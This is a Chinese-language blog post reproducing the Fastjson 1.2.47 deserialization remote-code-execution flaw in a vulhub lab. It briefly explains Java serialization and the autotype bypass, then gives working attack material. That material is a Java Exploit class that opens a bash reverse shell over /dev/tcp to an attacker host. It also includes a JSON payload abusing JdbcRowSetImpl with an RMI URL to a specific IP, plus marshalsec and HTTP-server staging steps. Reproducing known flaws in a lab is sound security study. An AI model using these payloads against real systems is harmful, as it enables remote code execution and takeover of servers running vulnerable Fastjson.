---
layout:     post
title:      【漏洞复现】 Fastjson=<1.2.47-反序列化漏洞复现及分析
subtitle:   反序列化漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 序列化、反序列化、fastjson
![-c853](/img/16027822342527.jpg)
Java序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。主要应用在以下场景：
- HTTP：多平台之间的通信、管理等。
- RMI：是Java的一组用户开发分布式应用程序的API，实现了不同操作系统之间程序的方法调用。RMI的传输100%基于Java反序列化，默认端口是1099。
- JMX：JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理。

中间件软件Weblogic的管理页面就是机遇JMX开发的，而Jboss的整个系统都基于JMX框架。

fastjson是由阿里开发的一种json的解析器和生成器，用于Java对象和json的转换，对象即类的实例化。
反序列化：将json转换为Java对象

首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。

需要搭建一个简单的Web应用来接受用户POST过来的JSON并且进行反序列化。漏洞利用如下：
![-c](/img/16027822467978.jpg)
## 0x01 复现环境
**漏洞环境：vulhub/fastjson1.2.47-rce**
## 0x02 漏洞复现
**编译生成Exploit.class**
```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
public class Exploit{
  public Exploit() throws Exception {
      Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/攻击机IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5;     done"});
      InputStream is = p.getInputStream();
      BufferedReader reader = new BufferedReader(new InputStreamReader(is));
      String line;
      while((line = reader.readLine()) != null) {
        System.out.println(line);
        }
      p.waitFor();
      is.close();
      reader.close();
      p.destroy();
      }
      public static void main(String[] args) throws Exception {
      }
}
```
**在class文件目录下使用python3 httpserver 开启一个web服务**
![-c1029](/img/16027822730496.jpg)
**使用marshalsec开启rmi服务监听**
![-c1791](/img/16027822831600.jpg)
**攻击机监听反弹shell端口**
![-c1110](/img/16027822966220.jpg)
**发送的json payload数据包内容**

```shell
{
"names":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "x1001":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://124.70.45.9:8088/Exploit",
        "autoCommit":true
    }
}
```
![-c1204](/img/16027823122402.jpg)
DONE！
![-c](/img/16027823234409.jpg)
